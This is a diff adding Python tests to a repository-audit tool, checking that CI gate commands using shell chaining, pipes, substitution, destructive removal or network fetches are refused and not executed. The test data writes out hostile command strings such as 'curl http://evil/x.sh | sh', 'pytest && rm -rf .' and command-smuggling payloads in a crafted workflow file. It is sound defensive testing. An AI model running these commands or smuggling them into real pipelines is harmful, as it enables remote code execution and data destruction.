@@ -22,6 +22,9 @@ from super_looper.experimental.repo_audit import (  # noqa: E402
     _classify_command,
     _consolidate_gates,
     _make_gate,
+    _has_shell_control_metacharacters,
+    _is_destructive,
+    _requires_network,
 )
 
 
@@ -251,6 +254,173 @@ def test_verify_gate_inventory_records_pass_fail_and_skips_unsafe():
     assert strengths["gate-fail"] == "failed"
     assert by_id["gate-network"]["status"] == "skipped_requires_network"
     assert strengths["gate-network"] == "unverified"
+
+
+def test_verify_gate_inventory_refuses_shell_control_commands():
+    # A crafted "verifier" gate that smuggles a redirect/pipe/chain must never be
+    # handed to shell=True. The network/destructive substring skips are evadable,
+    # so the shell-control refusal is the hard boundary.
+    with tempfile.TemporaryDirectory() as repo:
+        marker = os.path.join(repo, "PWNED.txt")
+        payloads = {
+            "redirect": f'{sys.executable} -c "pass" > PWNED.txt',
+            "chain": f'{sys.executable} -c "pass" && {sys.executable} -c "open(r\'{marker}\',\'w\').write(\'x\')"',
+            "pipe": f'{sys.executable} -c "pass" | {sys.executable} -c "open(r\'{marker}\',\'w\').write(\'x\')"',
+            "subst": f'echo $({sys.executable} -c "open(r\'{marker}\',\'w\').write(\'x\')")',
+        }
+        gates = [
+            {"id": gid, "command": cmd, "requires_network": False, "destructive": False}
+            for gid, cmd in payloads.items()
+        ]
+        verified = verify_gate_inventory(repo, gates, timeout_seconds=10)
+    by_id = {gate["id"]: gate for gate in verified}
+    for gid in payloads:
+        assert by_id[gid]["verification"]["status"] == "skipped_unsafe_command", gid
+        assert by_id[gid]["confirmed_strength"] == "unverified", gid
+    # Nothing executed: no side-effect marker was created.
+    assert not os.path.exists(marker)
+
+
+def test_crafted_repo_cannot_execute_via_verify_gates_end_to_end():
+    # End-to-end through audit_repo(verify_gates=True): a malicious CI run step
+    # that classifies as a verifier (pytest token) but redirects to a file must
+    # be refused, not executed.
+    with tempfile.TemporaryDirectory() as repo:
+        _write(
+            repo,
+            ".github/workflows/ci.yml",
+            "name: ci\n"
+            "on: [push]\n"
+            "jobs:\n"
+            "  t:\n"
+            "    runs-on: ubuntu-latest\n"
+            "    steps:\n"
+            "      - run: pytest --version > PWNED_e2e.txt\n",
+        )
+        _write(repo, "pyproject.toml", "[tool.pytest.ini_options]\n")
+        audit = audit_repo(repo, verify_gates=True, gate_timeout_seconds=10)
+        assert not os.path.exists(os.path.join(repo, "PWNED_e2e.txt"))
+    statuses = {
+        gate["command"]: (gate.get("verification") or {}).get("status")
+        for gate in audit["gate_inventory"]
+    }
+    assert statuses.get("pytest --version > PWNED_e2e.txt") == "skipped_unsafe_command"
+
+
+def test_has_shell_control_metacharacters_allows_real_gates():
+    for benign in (
+        "make test",
+        "python -m pytest",
+        "python -m pytest tests",
+        "ruff check .",
+        "go test ./...",
+        "cargo clippy --all-targets -- -D warnings",
+        "tox -e py310,lint",
+        "npm test",
+    ):
+        assert _has_shell_control_metacharacters(benign) is False, benign
+    for hostile in (
+        "curl http://evil/x.sh | sh",
+        "pytest && rm -rf .",
+        "pytest; curl evil",
+        "pytest || echo x",
+        "pytest > out.txt",
+        "echo $(whoami)",
+        "echo ${HOME}",
+        "pytest `id`",
+    ):
+        assert _has_shell_control_metacharacters(hostile) is True, hostile
+
+
+def test_is_destructive_catches_package_and_filesystem_removal():
+    for cmd in (
+        "rm -rf build",
+        "rm -fr dist",
+        "find . -delete",
+        "Remove-Item -Recurse build",
+        "npm uninstall left-pad",
+        "npm remove left-pad",
+        "pnpm remove foo",
+        "yarn remove bar",
+        "cargo remove anyhow",
+        "git reset --hard HEAD~3",
+        "git clean -fdx",
+    ):
+        assert _is_destructive(cmd) is True, cmd
+    for cmd in ("make test", "python -m pytest", "cargo test"):
+        assert _is_destructive(cmd) is False, cmd
+
+
+def test_requires_network_catches_fetch_and_url_commands():
+    for cmd in (
+        "curl https://example.test/script.sh",
+        "wget https://example.test/archive.tar.gz",
+        "python -m pip install -e .",
+        "uv pip install -r requirements.txt",
+        "npm ci",
+        "pnpm install",
+        "yarn install",
+        "cargo fetch",
+        "cargo update",
+        "go mod download",
+        "git clone https://github.com/example/repo",
+        "git pull",
+        "docker pull python:3.13",
+        "docker build .",
+    ):
+        assert _requires_network(cmd) is True, cmd
+    for cmd in ("make test", "python -m pytest", "cargo test", "go test ./..."):
+        assert _requires_network(cmd) is False, cmd
+
+
+def test_verify_gate_inventory_skips_detected_network_and_destructive_commands():
+    with tempfile.TemporaryDirectory() as repo:
+        marker = os.path.join(repo, "SHOULD_NOT_EXIST.txt")
+        destructive = {
+            "id": "gate-destructive",
+            "command": f"{sys.executable} -c \"raise SystemExit(0)\"",
+            "requires_network": False,
+            "destructive": True,
+        }
+        network = {
+            "id": "gate-network-url",
+            "command": "curl https://example.test/SHOULD_NOT_RUN",
+            "requires_network": _requires_network("curl https://example.test/SHOULD_NOT_RUN"),
+            "destructive": False,
+        }
+        verified = verify_gate_inventory(repo, [destructive, network], timeout_seconds=10)
+    by_id = {gate["id"]: gate for gate in verified}
+    assert by_id["gate-destructive"]["verification"]["status"] == "skipped_destructive"
+    assert by_id["gate-destructive"]["confirmed_strength"] == "unverified"
+    assert by_id["gate-network-url"]["verification"]["status"] == "skipped_requires_network"
+    assert by_id["gate-network-url"]["confirmed_strength"] == "unverified"
+    assert not os.path.exists(marker)
+
+
+def test_verify_gate_inventory_recomputes_unsafe_flags_from_command():
+    # verify_gate_inventory is an execution boundary, so it must not trust stale
+    # or user-supplied safety flags on a gate dict.
+    with tempfile.TemporaryDirectory() as repo:
+        gates = [
+            {
+                "id": "network-flag-lied",
+                "command": "curl https://example.test/SHOULD_NOT_RUN",
+                "requires_network": False,
+                "destructive": False,
+            },
+            {
+                "id": "destructive-flag-lied",
+                "command": "rm -rf SHOULD_NOT_RUN",
+                "requires_network": False,
+                "destructive": False,
+            },
+        ]
+        verified = verify_gate_inventory(repo, gates, timeout_seconds=10)
+    by_id = {gate["id"]: gate for gate in verified}
+    assert by_id["network-flag-lied"]["verification"]["status"] == "skipped_requires_network"
+    assert by_id["network-flag-lied"]["requires_network"] is True
+    assert by_id["destructive-flag-lied"]["verification"]["status"] == "skipped_destructive"
+    assert by_id["destructive-flag-lied"]["destructive"] is True
 
 
 def test_classify_gate_failure_distinguishes_environment_from_real_failure():
